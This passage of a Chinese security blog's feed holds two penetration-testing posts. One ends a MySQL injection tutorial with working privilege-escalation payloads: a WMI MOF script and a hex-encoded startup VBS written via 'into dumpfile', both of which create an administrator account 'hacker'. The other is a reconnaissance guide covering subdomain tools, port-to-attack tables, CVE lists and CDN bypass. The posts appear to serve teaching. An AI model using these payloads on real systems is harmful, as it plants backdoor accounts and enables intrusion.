EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0xinto dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下</p><p>痕迹清理：因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir &#x2F;s &#x2F;q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof &#x2F;F &#x2F;S</span><br><span class="line"></span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker &#x2F;delete</span><br><span class="line"></span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p><ul><li><p>启动项路径</p></li><li><p>Windows Server 2003 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">中文系统</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line">英文系统</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line">开关机项 需要自己建立对应文件夹</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure></li><li><p>Windows Server 2008 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></li><li><p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WshShell.Run &quot;net user hacker P@ssw0rd &#x2F;add&quot;, 0</span><br><span class="line">WshShell.Run &quot;net localgroup administrators hacker &#x2F;add&quot;, 0</span><br></pre></td></tr></table></figure></li><li><p>MySQL 写入启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br><span class="line">写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;MYSQL注入&quot;&gt;&lt;a href=&quot;#MYSQL注入&quot; class=&quot;headerlink&quot; title=&quot;MYSQL注入&quot;&gt;&lt;/a&gt;MYSQL注入&lt;/h1&gt;&lt;h2 id=&quot;Sql-注入介绍&quot;&gt;&lt;a href=&quot;#Sql-注入介绍&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="Web安全" scheme="https://kb-at-zero.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://kb-at-zero.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="Sql注入" scheme="https://kb-at-zero.github.io/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-信息收集</title>
    <link href="https://kb-at-zero.github.io/2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://kb-at-zero.github.io/2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-04-18T06:04:00.000Z</published>
    <updated>2021-04-20T05:47:37.529Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在平常的渗透测试的过程中，最重要也是最首要的一步就是信息收集，在这个阶段我们要尽可能的收集目标组织的信息，所谓“知己知彼、百战不殆”，我们越是了解目标，渗透起来就越容易。</p><h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><ul><li>whois 查询<ul><li>whois是一个标准的互联网协议，可用于收集网络注册信息，域名的注册、IP地址等信息。可以用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等）。在whois查询中，得到注册人的姓名和邮箱可以用于后期通过搜索引擎、社交网站爆破字典等，一般的小站点域名的所有人往往就是管理员。</li><li>kali系统下whois默认安装：whois example.domain<br><img src="/images/pasted-0.png" alt="upload successful"></li><li>爱站工具网：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></li><li>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com</a></li><li>VirusTotal：<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li></ul></li><li>备案信息查询<ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></li><li>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></li></ul></li></ul><h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><ul><li>Google搜索敏感信息<br><img src="/images/pasted-1.png" alt="upload successful"></li><li>GitHub搜索敏感信息：寻找相关敏感信息，如数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等</li><li>乌云等漏洞平台搜索历史漏洞信息</li><li>云盘搜索：<a href="https://www.chaonengsou.com/">https://www.chaonengsou.com/</a></li></ul><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>oneforall：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> （需配置api接口，运行时翻墙效果最佳）</li><li>Layer子域名挖掘机：<a href="https://www.webshell.cc/6384.html">https://www.webshell.cc/6384.html</a></li><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>在线子域名枚举：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> 、<a href="https://dns.aizhan.com/">https://dns.aizhan.com</a></li><li>空间搜索引擎：fofa（证书、title、icon等）、shodan、钟馗之眼、傻蛋</li><li>搜索引擎：Google、百度、bing等</li><li>第三方聚合应用枚举：<a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></li></ul><h2 id="常用端口信息"><a href="#常用端口信息" class="headerlink" title="常用端口信息"></a>常用端口信息</h2><ul><li>常用工具<ul><li>Nmap</li><li>御剑高速TCP端口扫描</li><li>Masscan</li><li>ZMap</li><li>Goby</li></ul></li></ul><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp/tftp/vsftpd文件传输协议</td><td>爆破/嗅探/溢出/后门/下载</td></tr><tr><td>22</td><td>ssh远程连接</td><td>爆破/openssh漏洞</td></tr><tr><td>23</td><td>Telnet远程连接</td><td>爆破/嗅探/弱口令</td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送/劫持/缓存投毒/欺骗</td></tr><tr><td>67/68</td><td>dhcp服务</td><td>劫持/欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破/嗅探</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破/未授权访问/远程命令执行</td></tr><tr><td>143</td><td>Imap协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破/搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入/未授权访问/弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010/端口溢出</td></tr><tr><td>512/513/514</td><td>Linux Rexec服务</td><td>爆破/Rlogin登陆</td></tr><tr><td>873</td><td>Rsync服务</td><td>文件上传/未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破/信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破/注入/SA弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破/注入/TNS爆破/反弹shell</td></tr><tr><td>2049</td><td>Nfs服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破/注入</td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破/shift后门</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破/认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2数据库</td><td>爆破/注入/提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破/注入/缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码/代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破/认证绕过</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问/爆破</td></tr><tr><td>7001/7002</td><td>weblogic</td><td>java反序列化/控制台弱口令</td></tr><tr><td>80/443</td><td>http/https</td><td>web应用漏洞/心脏滴血</td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行/注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令/写文件</td></tr><tr><td>8080/8089</td><td>Jboss/Tomcat/Resin</td><td>爆破/PUT文件上传/反序列化</td></tr><tr><td>8083/8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere控制台</td><td>爆破/java反序列化/弱口令</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017/27018</td><td>mongodb</td><td>未授权访问/爆破</td></tr></tbody></table><ul><li>web服务类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">tomcat--80&#x2F;8080&#x2F;8009</span><br><span class="line">           manager弱口令</span><br><span class="line">           put上传webshell</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           ajr文件包含漏洞-CVE-2020-1938</span><br><span class="line">Jboss--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">           console后台部署war包</span><br><span class="line">           JAVA反序列化</span><br><span class="line">           远程代码执行</span><br><span class="line">webSphere--9080</span><br><span class="line">               后台弱口令</span><br><span class="line">               任意文件泄露</span><br><span class="line">               JAVA反序列化</span><br><span class="line">weblogic--7001&#x2F;7002</span><br><span class="line">                   后台弱口令</span><br><span class="line">                   console后台部署war包</span><br><span class="line">                   SSRF</span><br><span class="line">                   测试页面上传webshell</span><br><span class="line">                           JAVA反序列化</span><br><span class="line">                               CVE-2018-2628</span><br><span class="line">                               CVE-2018-2893</span><br><span class="line">                               CVE-2017-10271</span><br><span class="line">                               CVE-2019-2725</span><br><span class="line">                               CVE-2019-2729</span><br><span class="line">Glassfish--8080&#x2F;4848</span><br><span class="line">                     暴力破解</span><br><span class="line">                     任意文件读取</span><br><span class="line">                     认证绕过</span><br><span class="line">Jetty--8080</span><br><span class="line">           远程共享缓冲区溢出</span><br><span class="line">Apache--80&#x2F;8080</span><br><span class="line">               HTTP慢速攻击</span><br><span class="line">               解析漏洞</span><br><span class="line">               目录遍历</span><br><span class="line">ApacheSolr--8983</span><br><span class="line">               远程命令执行</span><br><span class="line">               CVE-2017-12629</span><br><span class="line">               CVE-2019-0193</span><br><span class="line">IIS--80</span><br><span class="line">               put上传webshell</span><br><span class="line">               IIS解析漏洞</span><br><span class="line">               IIS提权</span><br><span class="line">               IIS远程远程代码执行-CVE-2017-7269</span><br><span class="line">Resin--8080</span><br><span class="line">               目录遍历</span><br><span class="line">               远程文件读取</span><br><span class="line">Axis2--8080</span><br><span class="line">           后台弱口令</span><br><span class="line">Lutos--1352</span><br><span class="line">           后台弱口令</span><br><span class="line">           信息泄露</span><br><span class="line">           跨站脚本攻击</span><br><span class="line">Nginx--80&#x2F;443</span><br><span class="line">           HTTP慢速攻击</span><br><span class="line">           解析漏洞</span><br></pre></td></tr></table></figure><ul><li>数据库类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Mysql--3306</span><br><span class="line">            弱口令</span><br><span class="line">            身份认证漏洞-cve-2012-2122</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            phpmyadmin万能密码or弱口令</span><br><span class="line">            UDF&#x2F;MOF提权</span><br><span class="line">Mssql--1433</span><br><span class="line">            弱口令</span><br><span class="line">            存储过程提权</span><br><span class="line">Oralce--1521</span><br><span class="line">            弱口令</span><br><span class="line">            TNS漏洞</span><br><span class="line">Redis--6379</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">PostgreSQL--5432</span><br><span class="line">            弱口令</span><br><span class="line">            缓冲区溢出-cve-2014-2669</span><br><span class="line">MongoDB--27001</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">DB2--5000</span><br><span class="line">            安全限制绕过进行未经授权操作-cve-2015-1922</span><br><span class="line">SysBase--5000&#x2F;4100</span><br><span class="line">            弱口令</span><br><span class="line">            命令注入</span><br><span class="line">Memcache--11211</span><br><span class="line">            未经授权访问</span><br><span class="line">            配置漏洞</span><br><span class="line">ElasticSearch--9200&#x2F;9300</span><br><span class="line">            未经授权访问</span><br><span class="line">            远程代码执行</span><br><span class="line">            文件办理</span><br><span class="line">            写入webshell</span><br></pre></td></tr></table></figure><ul><li>大数据类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hadoop--50010</span><br><span class="line">              远程命令执行</span><br><span class="line">Zookeeper--2181</span><br><span class="line">              未经授权访问</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>文件共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ftp--21</span><br><span class="line">        弱口令</span><br><span class="line">        匿名访问</span><br><span class="line">        上传后门</span><br><span class="line">        远程溢出</span><br><span class="line">        跳转攻击</span><br><span class="line">NFS--2049</span><br><span class="line">        未经授权访问</span><br><span class="line">Samba--137</span><br><span class="line">        弱口令</span><br><span class="line">        未经授权访问</span><br><span class="line">        远程代码执行-CVE-2015-0240</span><br><span class="line">LDAP--389</span><br><span class="line">        弱口令</span><br><span class="line">        注入</span><br><span class="line">        未经授权访问</span><br></pre></td></tr></table></figure><ul><li>远程访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SSH--22</span><br><span class="line">            弱口令</span><br><span class="line">            28退格漏洞</span><br><span class="line">            OpenSSL漏洞</span><br><span class="line">            用户名枚举</span><br><span class="line">Telent--23</span><br><span class="line">            弱口令</span><br><span class="line">RDP--3389</span><br><span class="line">            弱口令</span><br><span class="line">            Shitf粘滞键后门</span><br><span class="line">            缓冲区溢出</span><br><span class="line">            MS12-020</span><br><span class="line">            CVE-2019-0708</span><br><span class="line">VNC--5901</span><br><span class="line">            弱口令</span><br><span class="line">            认证口令绕过</span><br><span class="line">            拒绝服务攻击-CVE-2015-5239</span><br><span class="line">            权限提升-CVE-2013-6886</span><br><span class="line">Pcanywhere--5632</span><br><span class="line">            拒绝服务攻击</span><br><span class="line">            权限提升</span><br><span class="line">            代码执行</span><br><span class="line">X11--6000</span><br><span class="line">            未经授权访问-CVE-1999-0526</span><br></pre></td></tr></table></figure><ul><li>邮件服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SMTP--25&#x2F;465</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">            邮件伪造</span><br><span class="line">POP3--110&#x2F;995</span><br><span class="line">            弱口令</span><br><span class="line">            未经授权访问</span><br><span class="line">IMAP--143&#x2F;993</span><br><span class="line">            弱口令</span><br><span class="line">            任意文件读取</span><br></pre></td></tr></table></figure><ul><li>其他服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DNS--53</span><br><span class="line">            DNS区域传输</span><br><span class="line">            DNS劫持</span><br><span class="line">            DNS欺骗</span><br><span class="line">            DNS缓存投毒</span><br><span class="line">            DNS隧道</span><br><span class="line">DHCP--67&#x2F;68</span><br><span class="line">            DHCP劫持</span><br><span class="line">            DHCP欺骗</span><br><span class="line">SNMP--161</span><br><span class="line">            弱口令</span><br><span class="line">Rlogin--512&#x2F;513&#x2F;514</span><br><span class="line">            rlogin登录</span><br><span class="line">Rsync--873</span><br><span class="line">            未经授权访问</span><br><span class="line">            本地权限提升</span><br><span class="line">Zabbix--8069</span><br><span class="line">            远程命令执行</span><br><span class="line">RMI--1090&#x2F;1099</span><br><span class="line">            JAVA反序列化</span><br><span class="line">Docker--2375</span><br><span class="line">            未经授权访问</span><br></pre></td></tr></table></figure><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><ul><li>在指纹识别的学习过程中，有很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑Web指纹识别、WebRobo、椰树、轻量web指纹识别</li><li>在线网站查询：<ul><li>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li><li>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li><li>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net</a></li><li>Wapplyzer插件</li></ul></li><li>识别方式</li></ul><table><thead><tr><th>识别方式</th></tr></thead><tbody><tr><td>网站特有文件：如/templets/default/style/dedecms.css—dedecms</td></tr><tr><td>网站独有文件的md5：如favicon.ico，但是该文件可以被修改导致不准确。</td></tr><tr><td>网站文件命名规则</td></tr><tr><td>返回头的关键字</td></tr><tr><td>网页关键字：如/data/sessions/index.html——dedecms</td></tr><tr><td>Url特征</td></tr><tr><td>Meta特征</td></tr><tr><td>Script特征</td></tr><tr><td>robots.txt</td></tr><tr><td>网站路径特征</td></tr><tr><td>网站静态资源</td></tr><tr><td>爬虫网站目录信息</td></tr></tbody></table><h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><p>对应给定的目标，例如一个网站，首先获得的是目标域名，下一步就是找到域名背后的服务器ip，由于当前网站大多使用CDN（内容分发网络）对网站访问流量进行分流和一定程度的攻击防护，所以找出CDN背后的服务器真实ip就是一种“刚需”了。</p><ul><li>验证是否有CDN<ul><li>ping和nslookup（解析对应多个 IP 地址）</li><li>多地 ping 服务（IP 地址不唯一）：<ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li><li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li><li><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></li></ul></li></ul></li><li>绕过 CDN 查找网站真实 IP<ul><li>查询历史DNS记录<ul><li>1、查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询</li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线</li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询</li><li><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询</li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</li></ul></li><li>2、利用SecurityTrails（<a href="https://securitytrails.com/">https://securitytrails.com/</a> ） 平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</li></ul></li><li>查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。常用查找子域名方法有：微步在线(<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> )、 Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> )、 Google 搜索（Google site:baidu.com -www就能查看除www外的子域名）、各种子域名扫描器。</li><li>搜索引擎：常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</li><li>利用SSL证书寻找真实原始IP：对于目标网站的SSL证书，要查找其使用的IPv4主机，只需将”SHA1 fingerprint”（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</li><li>利用HTTP标头寻找真实原始IP：借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</li><li>利用网站返回的内容寻找真实原始IP：如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</li><li>使用国外主机解析域名。</li><li>国内很多 CDN 